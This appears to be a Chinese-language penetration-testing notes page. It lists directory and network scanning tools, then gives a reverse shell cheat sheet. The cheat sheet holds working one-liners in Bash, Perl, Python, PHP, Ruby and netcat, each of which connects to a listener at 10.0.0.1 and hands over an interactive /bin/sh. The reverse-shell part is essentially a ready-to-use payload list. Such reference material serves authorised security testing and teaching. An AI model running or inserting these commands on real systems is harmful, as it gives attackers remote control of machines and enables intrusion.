
### 掃描目錄
+ [dirsearch](https://github.com/maurosoria/dirsearch)
+ [gobuster](https://github.com/OJ/gobuster)
+ [dirb](https://github.com/v0re/dirb)
+ [ffuf](https://github.com/ffuf/ffuf)
+ [feroxbuster](https://github.com/epi052/feroxbuster)

### 網路掃描工具
+ [nmap](https://nmap.org/)
+ [RustScan](https://github.com/RustScan/RustScan)
+ [pnscan](https://github.com/ptrrkssn/pnscan)

### [Reverse Shell Cheat Sheet](https://pentestmonkey.net/)
+ Bash
`bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`

+ [PERL](https://pentestmonkey.net/tools/web-shells/perl-reverse-shell)
` perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' `

+ Python
` python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' `

+ [PHP](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)
` php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");' `

+ Ruby
` ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' `

+ [Netcat](https://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-127498)
` nc -e /bin/sh 10.0.0.1 1234 `
>即使它有多個版本的 netcat，其中一些不支持 -e 選項。
